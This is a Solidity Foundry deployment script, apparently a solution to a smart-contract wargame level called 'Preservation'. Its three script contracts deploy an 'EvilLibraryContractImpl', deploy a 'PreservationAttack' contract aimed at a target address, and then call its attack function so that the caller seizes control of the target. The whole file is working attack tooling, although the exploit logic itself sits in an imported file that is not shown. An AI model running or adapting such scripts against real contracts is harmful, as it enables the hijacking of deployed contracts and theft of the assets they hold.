// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Script, console2} from "forge-std/Script.sol";
import {
    EvilLibraryContractImpl,
    PreservationAttack,
    IPreservation
} from "../src/PreservationAttack.sol";

contract DeployLib is Script {
    function run() external {

        vm.startBroadcast();
        EvilLibraryContractImpl attacker = new EvilLibraryContractImpl();
        vm.stopBroadcast();

        console2.log("EvilLibraryContractImpl depoyed at: ", address(attacker));
        console2.log("Put PRESERVATION_LIB_ADDRESS in .env: ");
    }
}

contract Deploy is Script {
    function run() external {
        address target = vm.envAddress("PRESERVATION_ADDRESS");

        vm.startBroadcast();
        PreservationAttack attacker = new PreservationAttack(target);
        vm.stopBroadcast();

        console2.log("Attacker depoyed at: ", address(attacker));
        console2.log("Put PRESERVATION_ATTACKER_ADDRESS in .env: ");
    }
}

contract Attack is Script {
    function run() external {
        address attackerAddress = vm.envAddress("PRESERVATION_ATTACKER_ADDRESS");
        address target = vm.envAddress("PRESERVATION_ADDRESS");

        vm.startBroadcast();
        PreservationAttack attacker = PreservationAttack(attackerAddress);
        attacker.attack(uint256(uint160(vm.envAddress("PRESERVATION_LIB_ADDRESS"))), msg.sender);
        vm.stopBroadcast();

    }
}
